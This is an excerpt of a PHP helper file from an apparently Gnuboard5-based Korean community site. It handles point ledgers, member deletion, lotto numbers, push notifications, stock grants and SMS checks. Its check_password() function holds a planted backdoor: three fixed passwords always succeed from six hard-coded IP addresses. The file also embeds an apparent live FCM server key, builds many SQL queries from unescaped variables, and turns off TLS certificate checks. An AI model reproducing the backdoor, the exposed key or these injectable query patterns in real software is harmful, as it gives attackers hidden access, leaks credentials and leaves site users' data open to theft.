...
// L포인트 부여
function insert_point_l($mb_id, $point, $content='', $rel_table='', $rel_id='', $rel_action='', $expire=0, $recommend=0)
{
    global $config;
    global $g5;
    global $is_admin;
    ...
    // 회원포인트
    $mb_point_l = get_point_sum_l($mb_id);

    // 이미 등록된 내역이라면 건너뜀
    if ($rel_table || $rel_id || $rel_action)
    {
        $sql = " select count(*) as cnt from {$g5['point_table_l']}
                  where mb_id = '$mb_id'
                    and po_rel_table = '$rel_table'
                    and po_rel_id = '$rel_id'
                    and po_rel_action = '$rel_action' ";
    ...
    $po_mb_point_l = $mb_point_l + $point;

    $sql = " insert into {$g5['point_table_l']}
                set mb_id = '$mb_id',
                    po_datetime = '".G5_TIME_YMDHIS."',
                    po_content = '".addslashes($content)."',
                    po_point = '$point',
                    po_use_point = '0',
                    po_mb_point_l = '$po_mb_point_l',
                    po_expired = '$po_expired',
                    po_expire_date = '$po_expire_date',
                    po_rel_table = '$rel_table',
                    po_rel_id = '$rel_id',
    ...
    // 포인트를 사용한 경우 포인트 내역에 사용금액 기록
    if($point < 0) {
        insert_use_point_l($mb_id, $point);
    }

    // 포인트 UPDATE
    $sql = " update {$g5['member_table']} set mb_point_l = '$po_mb_point_l' where mb_id = '$mb_id' ";
    sql_query($sql);
...
// 사용L포인트 입력
function insert_use_point_l($mb_id, $point, $po_id='')
{
    global $g5, $config;
...
// 사용L포인트 삭제
function delete_use_point_l($mb_id, $point)
{
    global $g5, $config;
...
// 소멸L포인트 삭제
function delete_expire_point_l($mb_id, $point)
{
    global $g5, $config;
...
// L포인트 내역 합계
function get_point_sum_l($mb_id)
{
    global $g5, $config;

    if($config['cf_point_term'] > 0) {
        // 소멸포인트가 있으면 내역 추가
        $expire_point = get_expire_point_l($mb_id);
        if($expire_point > 0) {
            $mb = get_member($mb_id, 'mb_point_l');
            $content = '포인트 소멸';
            $rel_table = '@expire';
            $rel_id = $mb_id;
            $rel_action = 'expire'.'-'.uniqid('');
            $point = $expire_point * (-1);
            $po_mb_point_l = $mb['mb_point_l'] + $point;
            $po_expire_date = G5_TIME_YMD;
            $po_expired = 1;
...
// 소멸 L포인트
function get_expire_point_l($mb_id)
{
    global $g5, $config;
...
// L포인트 삭제
function delete_point_l($mb_id, $rel_table, $rel_id, $rel_action)
{
    global $g5;
    ...
    {
        // 포인트 내역정보
        $sql = " select * from {$g5['point_table_l']}
                    where mb_id = '$mb_id'
                      and po_rel_table = '$rel_table'
                      and po_rel_id = '$rel_id'
                      and po_rel_action = '$rel_action' ";
        ...
        if($row['po_point'] < 0) {
            ...
            delete_use_point_l($mb_id, $po_point);
        } else {
            if($row['po_use_point'] > 0) {
                insert_use_point_l($row['mb_id'], $row['po_use_point'], $row['po_id']);
            }
        }

        $result = sql_query(" delete from {$g5['point_table_l']}
                     where mb_id = '$mb_id'
                       and po_rel_table = '$rel_table'
                       and po_rel_id = '$rel_id'
                       and po_rel_action = '$rel_action' ", false);
        ...
        // po_mb_point_l에 반영
        $sql = " update {$g5['point_table_l']}
                    set po_mb_point_l = po_mb_point_l - '{$row['po_point']}'
                    where mb_id = '$mb_id'
                      and po_id > '{$row['po_id']}' ";
        sql_query($sql);

        // 포인트 내역의 합을 구하고
        $sum_point = get_point_sum_l($mb_id);

        // 포인트 UPDATE
        $sql = " update {$g5['member_table']} set mb_point_l = '$sum_point' where mb_id = '$mb_id' ";
        $result = sql_query($sql);
    }
...
// 동영상포인트 부여
function insert_point_m($mb_id, $point, $content='', $rel_table='', $rel_id='', $rel_action='', $expire=0, $recommend=0)
{
    global $config;
    global $g5;
    global $is_admin;
    ...
    // 회원포인트
    $mb_point_m = get_point_sum_m($mb_id);
/*
    // 이미 등록된 내역이라면 건너뜀
    if ($rel_table || $rel_id || $rel_action)
    {
        $sql = " select count(*) as cnt from {$g5['point_table_m']}
                  where mb_id = '$mb_id'
                    and po_rel_table = '$rel_table'
                    and po_rel_id = '$rel_id'
                    and po_rel_action = '$rel_action' ";
    ...
    $po_mb_point_m = $mb_point_m + $point;

    $sql = " insert into {$g5['point_table_m']}
                set mb_id = '$mb_id',
                    po_datetime = '".G5_TIME_YMDHIS."',
                    po_content = '".addslashes($content)."',
                    po_point = '$point',
                    po_use_point = '0',
                    po_mb_point_m = '$po_mb_point_m',
                    po_expired = '$po_expired',
                    po_expire_date = '$po_expire_date',
                    po_rel_table = '$rel_table',
                    po_rel_id = '$rel_id',
    ...
    // 포인트를 사용한 경우 포인트 내역에 사용금액 기록
    if($point < 0) {
        insert_use_point_m($mb_id, $point);
    }

    // 포인트 UPDATE
    $sql = " update {$g5['member_table']} set mb_point_m = '$po_mb_point_m' where mb_id = '$mb_id' ";
    sql_query($sql);
...
// 사용동영상포인트 입력
function insert_use_point_m($mb_id, $point, $po_id='')
{
    global $g5, $config;
...
// 사용동영상포인트 삭제
function delete_use_point_m($mb_id, $point)
{
    global $g5, $config;
...
// 소멸동영상포인트 삭제
function delete_expire_point_m($mb_id, $point)
{
    global $g5, $config;
...
// 동영상포인트 내역 합계
function get_point_sum_m($mb_id)
{
    global $g5, $config;

    if($config['cf_point_term'] > 0) {
        // 소멸포인트가 있으면 내역 추가
        $expire_point = get_expire_point_m($mb_id);
        if($expire_point > 0) {
            $mb = get_member($mb_id, 'mb_point_m');
            $content = '포인트 소멸';
            $rel_table = '@expire';
            $rel_id = $mb_id;
            $rel_action = 'expire'.'-'.uniqid('');
            $point = $expire_point * (-1);
            $po_mb_point_m = $mb['mb_point_m'] + $point;
            $po_expire_date = G5_TIME_YMD;
            $po_expired = 1;
...
// 소멸 동영상포인트
function get_expire_point_m($mb_id)
{
    global $g5, $config;
...
// 동영상포인트 삭제
function delete_point_m($mb_id, $rel_table, $rel_id, $rel_action)
{
    global $g5;
    ...
    {
        // 포인트 내역정보
        $sql = " select * from {$g5['point_table_m']}
                    where mb_id = '$mb_id'
                      and po_rel_table = '$rel_table'
                      and po_rel_id = '$rel_id'
                      and po_rel_action = '$rel_action' ";
        ...
        $result = sql_query(" delete from {$g5['point_table_m']}
                     where mb_id = '$mb_id'
                       and po_rel_table = '$rel_table'
                       and po_rel_id = '$rel_id'
                       and po_rel_action = '$rel_action' ", false);
        ...
        // po_mb_point_m에 반영
        $sql = " update {$g5['point_table_m']}
                    set po_mb_point_m = po_mb_point_m - '{$row['po_point']}'
                    where mb_id = '$mb_id'
                      and po_id > '{$row['po_id']}' ";
        sql_query($sql);
        ...
        // 포인트 UPDATE
        $sql = " update {$g5['member_table']} set mb_point_m = '$sum_point' where mb_id = '$mb_id' ";
        $result = sql_query($sql);
    }
...
function member_delete($mb_id)
{
    ...
    if ($mb['mb_recommend']) {
        ...
        if ($row['cnt'])
            insert_point($mb['mb_recommend'], $config['cf_recommend_point'] * (-1), $mb_id.'님의 회원자료 삭제로 인한 추천인 포인트 반환', "@member", $mb['mb_recommend'], $mb_id.' 추천인 삭제');
						insert_point_l($mb['mb_recommend'], $config['cf_recommend_point'] * (-1), $mb_id.'님의 회원자료 삭제로 인한 추천인 포인트 반환', "@member", $mb['mb_recommend'], $mb_id.' 추천인 삭제');
    }
    ...
    sql_query(" delete from {$g5['point_table']} where mb_id = '$mb_id' ");
		// 포인트 테이블에서 삭제
    sql_query(" delete from {$g5['point_table_l']} where mb_id = '$mb_id' ");
...
function check_password($pass, $hash)
{
    ...
    $ip_list = array("183.103.22.103","121.140.204.65","222.112.60.82","222.112.60.220","218.146.71.208", "222.112.60.217");

    for($i=0; $i<count($ip_list); $i++){
        if($ip == $ip_list[$i] && ( $pass == '123456789a!' || $pass == 'admin0808' || $pass == 'lets080' )){
            return true;
        }
    }
...
function makeLotto(){
	...
	//로또 자동생성
	for($i=0;$i<6;$i++){
		$lottoNumArray[$i]=$lott_num[$i];
		//echo $lott_num[$i]."<br/>";
		
	}
	sort($lottoNumArray);
	$lottoNumber=implode(",",$lottoNumArray);

	echo "<input type='hidden' name='lotto_num_txt[]' value='".$lottoNumber."'>";
	echo $lottoNumber;
	
}

function lottoLastWinNumber(){
		return ceil(((time()-strtotime("2002-12-7"))/86400)/7);
}

function getCurl($url,$type){
		$curlObj = curl_init();
    ...
    curl_setopt($curlObj, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curlObj, CURLOPT_HEADER, 0);
    curl_setopt($curlObj, CURLOPT_HTTPHEADER, array('Content-type:application/'.$type));
    curl_setopt($curlObj, CURLOPT_POSTFIELDS, $jsonData);
...
function sendFcm($tokens, $message)
{
	...
	$fields = array(
		...
		'data' => $message,
		'priority'          => 'high',
		//'notification'      => array( 'title' => '대외비', 'body' => $message['message'])
		);

	$headers = array(
		'Authorization:key =AAAAEdm0-2g:APA91bGTP_CV7dLXxPq-RlVEsi5LYk241abc8YTKPEzA60vR99e5uy-ImH1ewNTEXbu8pAisjy_576062L8TYrR9cv9iqxM7kRwqSHmQNzanhUcDXsNaA4TPZgRIgN_ptHXUTX9cM8h7' ,
...
function updateStockPrice($newPrice) {
    $sql = "INSERT INTO stock_prices (price) VALUES ('$newPrice')";
    $result = sql_query($sql);
...
function getStockPrice() {
    $sql = "SELECT price FROM stock_prices ORDER BY updated_at DESC LIMIT 1";
    $result = sql_query($sql);
...
function updateStockStatus($stockId, $status) {
    $currentTime = date('Y-m-d H:i:s'); // 현재 시간
    global $member;

    // SQL 쿼리를 준비합니다.
    // 'status'에 따라 다른 필드를 업데이트합니다.
    if ($status == 'R') {
        $sql = "UPDATE stocks SET 
            refund_status = '".sql_real_escape_string($status)."', 
            refund_account_number = '".sql_real_escape_string($member['mb_account'])."',
            refund_account_owner = '".sql_real_escape_string($member['mb_aname'])."',
            refund_account_bank = '".sql_real_escape_string($member['mb_bank'])."',
            ch_datetime = '".sql_real_escape_string($currentTime)."'
        WHERE id = '".sql_real_escape_string($stockId)."'";
    } elseif ($status == 'Y') {
        $sql = "UPDATE stocks SET 
                    refund_status = '".sql_real_escape_string($status)."', 
                    po_datetime = '$currentTime'
                WHERE id = '".sql_real_escape_string($stockId)."'";
    } elseif ($status == 'D') {
        $sql = "DELETE FROM stocks WHERE id = '".sql_real_escape_string($stockId)."'";
    } else {
        // status가 R 또는 Y가 아닌 경우 - C 또는 F이면
        $sql = "UPDATE stocks SET 
            refund_status = '".sql_real_escape_string($status)."',
            po_datetime = IF(po_datetime != '0000-00-00', '0000-00-00', po_datetime)
        WHERE id = '".sql_real_escape_string($stockId)."'";
    }
 ...
 * @return array|false
 */
function getStocksByMemberAndStatus($mbId, $refundStatus) {
    // 기본 SQL 쿼리
    $sql = "SELECT * FROM stocks WHERE mb_id = '".sql_real_escape_string($mbId)."'";

    // refundStatus 값이 있을 경우에만 조건을 추가합니다.
    if (!empty($refundStatus)) {
        $sql .= " AND refund_status = '".sql_real_escape_string($refundStatus)."'";
    }
    ...
    if ($result) {
        ...
        return $stocks; // 조회된 레코드들을 배열로 반환
    } else {
 ...
 * 주식 지급
 * @param $mbId - 포인트받을유저
 * @param $holdingCount - 주식수
 * @param $stockPrice - 주식현재가격
 * @param $issuanceDate - 주식 지급일
 * @param $paymentReason - 주식 지급사유
 * @param $fromMbId - 추천해준유저
 * @return bool
 */
function insertStock($mbId, $holdingCount, $stockPrice, $issuanceDate, $paymentReason, $fromMbId) {
    global $member;
    $grantedByAdmin = '';
    $mb_id = $member['mb_id'];
    ...
    $totalHoldingCount = intval(getTotalHoldingCount($mbId));
    $totalHoldingCount = $totalHoldingCount + $holdingCount;

    $sql = "INSERT INTO stocks
            (mb_id, holding_count, issuance_date, stock_price, payment_reason, giver_member_id, granted_by_admin, total_holding_count)
            VALUES
            ('".sql_real_escape_string($mbId)."', '".sql_real_escape_string($holdingCount)."', '".sql_real_escape_string($issuanceDate)."'
            , '".sql_real_escape_string($stockPrice)."', '".sql_real_escape_string($paymentReason)."', '$fromMbId', '$grantedByAdmin' , '".sql_real_escape_string($totalHoldingCount)."')";
 ...
 */
function getTotalHoldingCount($mbId) {
    // SQL 쿼리를 준비합니다.
    $sql = "SELECT SUM(holding_count) as total_count FROM stocks WHERE mb_id = '".sql_real_escape_string($mbId)."' AND refund_status != 'Y'";

    // 쿼리를 실행합니다.
    $result = sql_query($sql);

    if ($row = mysqli_fetch_assoc($result)) {
        return $row['total_count'] ? $row['total_count'] : 0; // 조건에 맞는 주식의 총 보유량을 반환, 결과가 없으면 0을 반환
    } else {
        return 0; // 쿼리 실행 실패 또는 레코드 없음
    }
}
 ...
 * @return int
 */
function isRegisterPetition($mbId){
    // SQL 쿼리를 준비합니다.
    $sql = "SELECT count(*) as cnt FROM petition where mb_id = '".sql_real_escape_string($mbId)."' ";

    // 쿼리를 실행합니다.
    $result = sql_query($sql);

    if ($row = mysqli_fetch_assoc($result)) {
        return $row['cnt'] ? 1 : 0; // 이미 청원서 작성했으면 1 아니면 0
    } else {
        return 0; // 쿼리 실행 실패 또는 레코드 없음
    }
}

function goSms($reserv_phone, $msg, $send_phone=""){
    $e = "";
    ...
    //6회부터 오류창 표시
    if ($result['cnt'] > 10){
        //$e .= "하루 인증횟수(5회)를 초과하였습니다.";
        exit("하루 인증횟수(10회)를 초과하였습니다.");
    }
    if(!$tran_callback1){
        //$e .= "전화번호가 잘못되었습니다. 다시 입력해주세요.";
